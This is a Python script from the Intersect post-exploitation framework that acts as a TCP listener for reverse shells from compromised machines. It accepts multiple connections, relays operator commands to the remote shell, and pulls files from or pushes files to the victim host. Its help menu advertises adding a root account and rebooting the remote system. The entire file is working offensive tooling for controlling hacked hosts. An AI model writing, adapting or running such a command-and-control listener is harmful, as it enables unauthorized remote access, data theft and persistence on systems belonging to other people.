#!/usr/bin/python

# Intersect 2.5
# TCP Shell Listener
# https://github.com/ohdae/Intersect-2.0

import os, sys
import socket
import time

activePID = []
socksize = 4096

try: 
    HOST = sys.argv[1]                             
    PORT = int(sys.argv[2])
except IndexError:
    print("You must specify a host IP address and port number!")
    print("usage: ./tcp-client.py 192.168.1.4 4444")
    sys.exit()
                        
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
server.bind((HOST, PORT))
server.listen(5)
print("Listening on port %s for 5 connetions..." % PORT)

def reaper():                              
    while activePID:                        
        pid,stat = os.waitpid(0, os.WNOHANG)     
        if not pid: break
        activePID.remove(pid)

def accept():
    while 1:                                     
        conn, addr = server.accept()
        print "[!] New connection!"
        reaper()
        childPid = os.fork()
        if childPid == 0:
            handler(conn)
        else:
            activePID.append(childPid)

def handler(conn):
    time.sleep(3)

    while True:
        data = conn.recv(socksize)
        cmd = raw_input(data)
        conn.sendall(str(cmd))
        if cmd == (':killme'):
            print("[!] Shutting down shell!")
            conn.close()
            sys.exit(0)
        elif cmd.startswith(':download'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            data = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(data)
            newfile.close()
            if os.path.exists(filename) is True:
                print("[+] Download complete.")
                print("[+] File location: " + os.getcwd()+"/"+filename)
        elif cmd.startswith(':upload'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            sendfile = open(loc_file, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
        elif cmd == (":exec"):
            print("Feature not yet fully implemented!")
        elif cmd == (":help"):
            print(" Available Commands: ")
            print("---------------------------------")
            print(" :download <file>  | download file from host")
            print(" :upload <file>    | upload file to host")
            print(" :mods             | list available modules")
            print(" :exec <task>      | run Intersect tasks")
            print(" :addroot <name>   | add new root account")
            print(" :reboot           | reboot remote host system")
            print(" :help             | display this menu")
            print(" :killme           | shuts down shell connection\n")
            print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")

    conn.close()
    os._exit(0)


accept()

